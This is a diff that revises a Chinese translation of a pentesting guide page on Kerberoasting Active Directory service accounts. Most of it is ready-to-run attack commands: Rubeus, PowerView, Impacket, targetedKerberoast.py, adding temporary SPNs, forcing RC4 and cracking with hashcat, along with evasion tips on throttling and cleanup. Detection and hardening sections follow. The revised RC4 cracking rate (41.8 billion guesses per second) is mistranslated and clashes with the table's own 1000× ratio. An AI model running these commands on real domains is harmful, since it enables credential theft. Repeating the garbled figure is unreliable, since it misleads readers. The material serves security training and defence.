@@ -4,32 +4,32 @@
 
 ## Kerberoast
 
-Kerberoasting 专注于获取 TGS ticket，特别是那些与在 Active Directory (AD) 中以用户帐户（不包括计算机帐户）运行的服务相关的 ticket。这些 ticket 的加密使用起源于用户密码的密钥，允许离线破解凭据。ServicePrincipalName (SPN) 属性非空表明使用用户帐户作为服务。
+Kerberoasting 专注于获取 TGS tickets，具体来说是获取与 Active Directory (AD) 中以用户账户运行的服务相关的 tickets，不包括 computer accounts。这些 tickets 的加密使用源自用户密码的密钥，因此可以进行离线凭据破解。使用用户账户作为服务的情况由非空的 ServicePrincipalName (SPN) 属性表示。
 
-任何已通过身份验证的域用户都可以请求 TGS ticket，因此不需要特殊权限。
+任何经过身份验证的域用户都可以请求 TGS tickets，因此不需要特殊权限。<sup>[[4]](#references)[[5]](#references)</sup>
 
-### 关键点
+### 要点
 
-- 针对在用户帐户下运行的服务的 TGS ticket（即已设置 SPN 的帐户；非计算机帐户）。
-- ticket 使用从服务帐户密码派生的密钥加密，可离线破解。
-- 不需要提升权限；任何已认证的帐户都可以请求 TGS ticket。
+- 目标是以用户账户运行的服务所使用的 TGS tickets（即设置了 SPN 的账户，而不是 computer accounts）。
+- Tickets 使用从服务账户密码派生的密钥进行加密，并且可以离线破解。
+- 不需要提升权限；任何经过身份验证的账户都可以请求 TGS tickets。
 
 > [!WARNING]
-> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
-> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.
+> 大多数公开工具更倾向于请求 RC4-HMAC（etype 23）service tickets，因为它们比 AES 更容易破解。RC4 TGS hashes 以 `$krb5tgs$23$*` 开头，AES128 以 `$krb5tgs$17$*` 开头，AES256 以 `$krb5tgs$18$*` 开头。但是，许多环境正在转向仅使用 AES。不要假设只有 RC4 相关。
+> 另外，应避免“spray-and-pray” roasting。Rubeus 的默认 kerberoast 可以查询并请求所有 SPN 的 tickets，噪声较大。应先枚举并定位有价值的 principals。
 
-### Service account secrets & Kerberos crypto cost
+### 服务账户机密信息与 Kerberos 加密成本
 
-许多服务仍以人工管理密码的用户帐户运行。KDC 使用由这些密码派生的密钥来加密服务 ticket，并将密文提供给任何经过身份验证的主体，因此 kerberoasting 提供了无限的离线猜测机会，且不会触发锁定或 DC 的遥测告警。加密模式决定了破解预算：
+许多服务仍以使用人工管理密码的用户账户运行。KDC 使用从这些密码派生的密钥加密 service tickets，并将 ciphertext 提供给任何经过身份验证的 principal，因此 kerberoasting 可以在不触发账户锁定或产生 DC telemetry 的情况下进行无限次离线猜测。加密模式决定了破解预算：
 
-| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
+| 模式 | 密钥派生 | 加密类型 | Approx. RTX 5090 吞吐量* | 备注 |
 | --- | --- | --- | --- | --- |
-| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
-| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |
+| AES + PBKDF2 | 使用 4,096 次迭代的 PBKDF2-HMAC-SHA1，以及由 domain + SPN 生成的每个 principal 专属 salt | etype 17/18（`$krb5tgs$17$`、`$krb5tgs$18$`） | ~680 万次猜测/秒 | Salt 会阻止 rainbow tables，但仍可快速破解较短的密码。 |
+| RC4 + NT hash | 对密码执行一次 MD4（无 salt 的 NT hash）；Kerberos 仅为每个 ticket 混入一个 8 字节的 confounder | etype 23（`$krb5tgs$23$`） | ~41.8 **十亿**次猜测/秒 | 比 AES 快约 1000 倍；当 `msDS-SupportedEncryptionTypes` 允许时，攻击者会强制使用 RC4。 |
 
-*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).
+*基准数据来自 Chick3nman，详见 [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)。<sup>[[3]](#references)</sup>
 
-RC4 的 confounder 仅随机化了密钥流；它并没有为每次猜测增加计算量。除非服务帐户依赖随机秘密（如 gMSA/dMSA、机器帐户或由 vault 管理的字符串），否则妥协速度纯粹受限于 GPU 预算。强制仅使用 AES etypes 可消除每秒数十亿次猜测的劣化，但弱的人类密码仍可能被 PBKDF2 迅速攻破。
+RC4 的 confounder 只会随机化 keystream；它不会增加每次猜测的工作量。除非服务账户依赖随机 secrets（gMSA/dMSA、machine accounts 或由 vault 管理的 strings），否则 compromise 速度完全取决于 GPU budget。强制使用仅 AES 的 etypes 可以移除每秒十亿次猜测的 downgrade，但弱的人类密码仍会被 PBKDF2 破解。<sup>[[3]](#references)</sup>
 
 ### Attack
 
@@ -54,7 +54,7 @@ kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o ke
 # 2) Request TGS for selected SPNs and dump
 kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
 ```
-包含 kerberoast 检查的多功能工具：
+包括 kerberoast 检查的多功能工具：
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
@@ -72,7 +72,7 @@ Get-NetUser -SPN | Select-Object serviceprincipalname
 # Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
 .\Rubeus.exe kerberoast /stats
 ```
-- 方法 1: 请求 TGS 并从内存 dump
+- Technique 1：请求 TGS 并从内存中 dump
 ```powershell
 # Acquire a single service ticket in memory for a known SPN
 Add-Type -AssemblyName System.IdentityModel
@@ -104,21 +104,21 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerbe
 .\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
 ```
 > [!WARNING]
-> 一次 TGS 请求会生成 Windows Security Event 4769（请求了一个 Kerberos 服务票证）。
+> TGS 请求会生成 Windows 安全事件 4769（请求了 Kerberos 服务票据）。
 
-### OPSEC 和 AES-only 环境
+### OPSEC 和仅限 AES 的环境
 
-- 有意请求 RC4，用于没有 AES 的账户：
-- Rubeus: `/rc4opsec` 使用 tgtdeleg 枚举没有 AES 的账户并请求 RC4 服务票证。
-- Rubeus: `/tgtdeleg` 与 kerberoast 一起也会在可能情况下触发 RC4 请求。
-- Roast AES-only 账户，而不是静默失败：
-- Rubeus: `/aes` 枚举启用 AES 的账户并请求 AES 服务票证（etype 17/18）。
-- 如果你已经持有 TGT (PTT 或来自 .kirbi)，你可以使用 `/ticket:<blob|path>` 与 `/spn:<SPN>` 或 `/spns:<file>` 并跳过 LDAP。
-- 目标、限流和降低噪音：
+- 对没有 AES 的账户主动请求 RC4：
+- Rubeus：`/rc4opsec` 使用 tgtdeleg 枚举不支持 AES 的账户，并请求 RC4 服务票据。
+- Rubeus：`/tgtdeleg` 配合 kerberoast 使用时，也会在可能的情况下触发 RC4 请求。<sup>[[6]](#references)</sup>
+- 对仅支持 AES 的账户进行 Roast，避免静默失败：
+- Rubeus：`/aes` 枚举已启用 AES 的账户，并请求 AES 服务票据（etype 17/18）。
+- 如果你已经持有 TGT（通过 PTT 或来自 .kirbi），可以将 `/ticket:<blob|path>` 与 `/spn:<SPN>` 或 `/spns:<file>` 配合使用，从而跳过 LDAP。
+- 目标选择、限速和降低噪声：
 - 使用 `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>` 和 `/jitter:<1-100>`。
-- 使用 `/pwdsetbefore:<MM-dd-yyyy>` 过滤可能弱口令（较旧的密码），或使用 `/ou:<DN>` 针对特权 OU。
+- 使用 `/pwdsetbefore:<MM-dd-yyyy>`（较早设置的密码）筛选可能使用弱密码的账户，或使用 `/ou:<DN>`  targeting 特权 OU。<sup>[[8]](#references)</sup>
 
-Examples (Rubeus):
+示例（Rubeus）：
 ```powershell
 # Kerberoast only AES-enabled accounts
 .\Rubeus.exe kerberoast /aes /outfile:hashes.aes
@@ -140,29 +140,29 @@ hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
 # AES256-CTS-HMAC-SHA1-96 (etype 18)
 hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
 ```
-### 持久化 / 滥用
+### Persistence / Abuse
 
-如果你控制或可以修改一个账户，你可以通过添加一个 SPN 使其成为 kerberoastable：
+如果你控制或可以修改某个账户，可以通过添加 SPN 使其成为 kerberoastable：
 ```powershell
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
 ```
-将账户降级以启用 RC4，便于进行 cracking（需要对目标对象具有写权限）：
+将帐户降级以启用 RC4，从而更易于破解（需要对目标对象具有写入权限）：
 ```powershell
 # Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
 # Mixed RC4+AES (value 28)
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
 ```
-#### 定向 Kerberoast 通过 GenericWrite/GenericAll 对用户 (临时 SPN)
+#### 通过 GenericWrite/GenericAll 针对用户执行 Kerberoast（临时 SPN）
 
-当 BloodHound 显示你对某个用户对象有控制权（例如 GenericWrite/GenericAll）时，即使该用户当前没有任何 SPN，你也可以可靠地“定向 roasted”该用户：
+当 BloodHound 显示你拥有对某个用户对象的控制权（例如 GenericWrite/GenericAll）时，即使该用户当前没有任何 SPN，你仍然可以可靠地对该特定用户执行 targeted Kerberoast：<sup>[[9]](#references)</sup>
 
-- 将一个临时 SPN 添加到受控用户，使其可用于 Kerberoast。
-- 为该 SPN 请求一个使用 RC4 (etype 23) 加密的 TGS-REP，以便更容易破解。
-- 使用 hashcat 破解 `$krb5tgs$23$...` 哈希。
-- 清理 SPN 以减少痕迹。
+- 向受控用户添加临时 SPN，使其可被 roast。
+- 为该 SPN 请求使用 RC4（etype 23）加密的 TGS-REP，以便进行 cracking。
+- 使用 hashcat 破解 `$krb5tgs$23$...` hash。
+- 清理 SPN，减少 footprint。
 
-Windows (PowerView/Rubeus):
+Windows (PowerView/Rubeus)：
 ```powershell
 # Add temporary SPN on the target user
 Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose
@@ -173,62 +173,62 @@ Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSv
 # Remove SPN afterwards
 Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
 ```
-Linux 单行命令 (targetedKerberoast.py 自动化 add SPN -> request TGS (etype 23) -> remove SPN):
+Linux 单行命令（targetedKerberoast.py 自动执行 add SPN -> request TGS (etype 23) -> remove SPN）：<sup>[[2]](#references)</sup>
 ```bash
 targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
 ```
-使用 hashcat autodetect 破解输出 (mode 13100 for `$krb5tgs$23$`):
+使用 hashcat 自动检测破解输出（`$krb5tgs$23$` 对应模式 13100）：
 ```bash
 hashcat <outfile>.hash /path/to/rockyou.txt
 ```
-Detection notes: 添加/删除 SPNs 会产生目录更改（目标用户上会生成 Event ID 5136/4738），TGS 请求会生成 Event ID 4769。考虑限速并尽快清理。
+检测说明：添加/删除 SPN 会产生目录变更（目标用户上的 Event ID 5136/4738），而 TGS 请求会生成 Event ID 4769。请考虑限制请求速率并及时清理痕迹。
 
-You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast
+你可以在这里找到用于 kerberoast attacks 的实用工具：https://github.com/nidem/kerberoast
 
-If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:
+如果你在 Linux 中遇到此错误：`Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`，这是由于本地时间偏差导致的。请与 DC 同步：
 
-- `ntpdate <DC_IP>` (deprecated on some distros)
+- `ntpdate <DC_IP>`（某些发行版中已弃用）
 - `rdate -n <DC_IP>`
 
-### Kerberoast 在没有域账户的情况下 (AS-requested STs)
+### 无需 domain account 的 Kerberoast（AS-requested STs）
 
-In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.
+2022 年 9 月，Charlie Clark 介绍了这样一种情况：如果某个 principal 不要求 pre-authentication，就可以通过构造 KRB_AS_REQ，并修改请求主体中的 sname，从而获取 service ticket，而不是 TGT。这与 AS-REP roasting 类似，并且不需要有效的 domain credentials。
 
-See details: Semperis write-up “New Attack Paths: AS-requested STs”.
+详情请参阅 Semperis 的报告“New Attack Paths: AS-requested STs”。<sup>[[10]](#references)</sup>
 
 > [!WARNING]
-> 你必须提供一个用户列表，因为在没有有效凭据的情况下，你无法通过此技术查询 LDAP。
+> 你必须提供用户列表，因为没有有效凭据时，无法使用此技术查询 LDAP。
 
 Linux
 
-- Impacket (PR #1413):
+- Impacket（PR #1413）：
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
 ```
 Windows
 
-- Rubeus (PR #139):
+- Rubeus (PR #139)：
 ```powershell
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
 ```
 相关
 
-如果您针对的是 AS-REP roastable 用户，也请参见：
+如果你要 targeting AS-REP roastable users，请参阅：
 
 {{#ref}}
 asreproast.md
 {{#endref}}
 
-### 检测
+### Detection
 
-Kerberoasting 可能很隐蔽。请在 DCs 上查找 Event ID 4769，并应用筛选以减少噪音：
+Kerberoasting 可能具有隐蔽性。监控 DC 中的 Event ID 4769，并应用以下过滤条件以减少噪声：
 
-- 排除服务名 `krbtgt` 以及以 `$` 结尾的服务名（计算机帐户）。
-- 排除来自机器帐户的请求（`*$$@*`）。
-- 仅考虑成功的请求（Failure Code `0x0`）。
-- 跟踪加密类型：RC4 (`0x17`)、AES128 (`0x11`)、AES256 (`0x12`)。不要只因 `0x17` 而报警。
+- 排除服务名称 `krbtgt` 以及以 `$` 结尾的服务名称（计算机账户）。
+- 排除来自机器账户的请求（`*$$@*`）。
+- 仅保留成功的请求（Failure Code `0x0`）。
+- 跟踪加密类型：RC4（`0x17`）、AES128（`0x11`）、AES256（`0x12`）。不要仅针对 `0x17` 触发告警。
 
-示例 PowerShell 排查：
+PowerShell 初步分析示例：
 ```powershell
 Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
 Where-Object {
@@ -242,27 +242,28 @@ Select-Object -ExpandProperty Message
 ```
 其他想法：
 
-- 针对每个主机/用户建立正常的 SPN 使用基线；当单一主体对大量不同 SPN 进行突发请求时触发告警。
-- 在已启用 AES 的域中标记不寻常的 RC4 使用。
+- 按主机/用户建立正常 SPN 使用基线；对于单个 principal 突发请求大量不同 SPN 的情况发出警报。
+- 在已强化 AES 的域中标记异常的 RC4 使用情况。
 
-### 缓解 / 加固
+### Mitigation / Hardening
 
-- 使用 gMSA/dMSA 或机器账户为服务提供身份。托管账户具有 120+ 字符的随机密码并会自动轮换，使离线破解变得不切实际。
-- 通过将 `msDS-SupportedEncryptionTypes` 设置为仅 AES（十进制 24 / 十六进制 0x18）并随后轮换密码以派生 AES 密钥，从而在服务账户上强制使用 AES。
-- 在可能的情况下，在环境中禁用 RC4 并监控 RC4 使用尝试。在 DC 上，可以使用 `DefaultDomainSupportedEncTypes` 注册表值来为没有设置 `msDS-SupportedEncryptionTypes` 的账户引导默认加密类型。务必彻底测试。
-- 从用户账户中移除不必要的 SPN。
-- 如果无法使用托管账户，则为服务账户使用长度较长且随机的密码（25+ 字符）；禁止常见密码并定期审计。
+- 为服务使用 gMSA/dMSA 或机器账户。Managed accounts 使用长度超过 120 个字符的随机密码并自动轮换，使 offline cracking 几乎不可行。<sup>[[7]](#references)</sup>
+- 通过将 `msDS-SupportedEncryptionTypes` 设置为仅使用 AES（十进制 24 / 十六进制 0x18）来对服务账户强制启用 AES，然后轮换密码，以便派生 AES 密钥。<sup>[[7]](#references)</sup>
+- 在可能的情况下，在环境中禁用 RC4，并监控尝试使用 RC4 的行为。在 DC 上，可以使用 `DefaultDomainSupportedEncTypes` 注册表值，为未设置 `msDS-SupportedEncryptionTypes` 的账户指定默认值。务必进行充分测试。
+- 从用户账户中移除不必要的 SPN。<sup>[[7]](#references)</sup>
+- 如果无法使用 managed accounts，则为服务账户使用长度较长的随机密码（25 个字符以上）；禁止使用常见密码并定期审计。<sup>[[7]](#references)</sup>
 
 ## References
 
-- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
-- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
-- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
-- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
-- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
-- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
+- [1] [HTB: Breach – 实战中的 NetExec LDAP kerberoast + hashcat cracking](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+- [3] [Matthew Green – Kerberoasting：来自 legacy Kerberos Crypto 的低技术、高影响攻击（2025-09-10）](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
+- [4] [Kerberos (II)：如何攻击 Kerberos？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [5] [ired.team – Active Directory Kerberos Abuse：T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
+- [6] [ired.team – Kerberoasting：在启用 AES 时请求使用 RC4 加密的 TGS](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
+- [7] [Microsoft Security Blog（2024-10-11）– Microsoft 关于帮助缓解 Kerberoasting 的指导](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
+- [8] [SpecterOps – Rubeus kerberoast 命令文档](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
+- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
+- [10] [Semperis – 新的 Attack Paths？AS Requested Service Tickets（Charlie Clark，2022 年 9 月）](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
 
 {{#include ../../banners/hacktricks-training.md}}
